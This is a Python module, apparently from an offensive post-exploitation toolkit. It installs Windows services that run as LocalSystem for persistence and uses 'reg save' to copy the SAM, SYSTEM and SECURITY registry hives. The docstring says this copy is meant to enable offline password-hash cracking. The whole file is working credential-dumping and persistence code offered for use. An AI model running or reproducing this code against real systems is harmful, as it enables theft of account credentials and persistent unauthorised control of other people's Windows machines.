"""Service control and hive copies: the SYSTEM-level half of Windows access.

``windows.persist`` puts a command into the *user's* logon path. This is the
other end of the scale:

* a **service** starts at boot as ``LocalSystem``, survives logoffs, and can be
  installed without touching the user's profile;
* ``reg save`` copies ``SAM``/``SYSTEM``/``SECURITY`` out as files, which is
  what makes offline hash cracking possible from a live host.

The argv builders are pure, so the exact ``sc`` / ``reg`` invocation is
testable without Windows.
"""

from __future__ import annotations

import os

from omni.core import console, proc

__all__ = ["HIVES", "create_args", "delete_args", "query_args", "start_args",
           "stop_args", "parse_query", "install", "remove", "start", "stop",
           "query", "save_hives", "reg_save_args"]

#: readable hive names -> the ``reg save`` argument for each
HIVES = {"sam": r"HKLM\SAM", "system": r"HKLM\SYSTEM",
         "security": r"HKLM\SECURITY", "software": r"HKLM\SOFTWARE"}

#: fields ``sc query``/``sc qc`` print, normalised to snake case
_QUERY_KEYS = ("SERVICE_NAME", "DISPLAY_NAME", "TYPE", "STATE",
               "WIN32_EXIT_CODE", "SERVICE_EXIT_CODE", "CHECKPOINT",
               "WAIT_HINT", "BINARY_PATH_NAME", "SERVICE_START_NAME",
               "START_TYPE", "ERROR_CONTROL", "TAG")


def create_args(name: str, binary: str, start: str = "auto",
                display: str = "") -> list[str]:
    """``sc create`` argv: a service that runs ``binary`` as LocalSystem."""
    if not name or not binary:
        raise ValueError("create needs a service name and a binary path")
    argv = ["sc", "create", name, "binPath=", binary,
            "start=", start or "auto"]
    if display:
        argv += ["DisplayName=", display]
    return argv


def delete_args(name: str) -> list[str]:
    return ["sc", "delete", name]


def start_args(name: str) -> list[str]:
    return ["sc", "start", name]


def stop_args(name: str) -> list[str]:
    return ["sc", "stop", name]


def query_args(name: str = "") -> list[str]:
    return ["sc", "query", name] if name else ["sc", "query"]


def parse_query(text: str) -> list[dict]:
    """Rows from ``sc query``/``sc qc`` output (one dict per service)."""
    rows: list[dict] = []
    current: dict = {}
    for line in (text or "").splitlines():
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        key, value = key.strip().upper(), value.strip()
        if key not in _QUERY_KEYS:
            continue
        if key == "SERVICE_NAME" and current.get("service_name"):
            rows.append(current)
            current = {}
        current[key.lower()] = value
    if current.get("service_name"):
        rows.append(current)
    return rows


def install(name: str, binary: str, start: str = "auto",
            display: str = "") -> proc.Result:
    """Create a service (needs admin, like every real persistence primitive)."""
    res = proc.run(create_args(name, binary, start, display), timeout=60)
    if res.ok:
        console.ok(f"service '{name}' created -> {binary} (start={start})")
    else:
        console.warn(f"sc create failed: {res.text[:160]}")
    return res


def start(name: str) -> proc.Result:
    return proc.run(start_args(name), timeout=90)


def stop(name: str) -> proc.Result:
    return proc.run(stop_args(name), timeout=90)


def remove(name: str) -> proc.Result:
    res = proc.run(delete_args(name), timeout=60)
    if res.ok:
        console.warn(f"service '{name}' marked for deletion")
    return res


def query(name: str = "") -> list[dict]:
    """Parsed ``sc query`` rows (all services when ``name`` is blank)."""
    return parse_query(proc.run(query_args(name), timeout=60).out)


def reg_save_args(hive: str, out: str) -> list[str]:
    """``reg save`` argv for one hive (``hive`` may be a friendly name)."""
    target = HIVES.get(hive.lower(), hive)
    return ["reg", "save", target, out, "/y"]


def save_hives(outdir: str, hives: list[str] | None = None) -> dict[str, str]:
    """Copy hives with ``reg save``; returns ``{hive: path}`` for the ones
    that landed (SAM/SECURITY need admin, SYSTEM usually does too)."""
    os.makedirs(outdir, exist_ok=True)
    saved: dict[str, str] = {}
    for hive in (hives or list(HIVES)):
        name = os.path.basename(HIVES.get(hive.lower(), hive))
        target = os.path.join(outdir, f"{name}.hive")
        res = proc.run(reg_save_args(hive, target), timeout=300)
        if res.ok and os.path.isfile(target):
            saved[hive] = target
            console.ok(f"{hive} -> {target} "
                       f"({os.path.getsize(target)} bytes)")
        else:
            console.warn(f"{hive} not saved: {res.text[:140]}")
    return saved
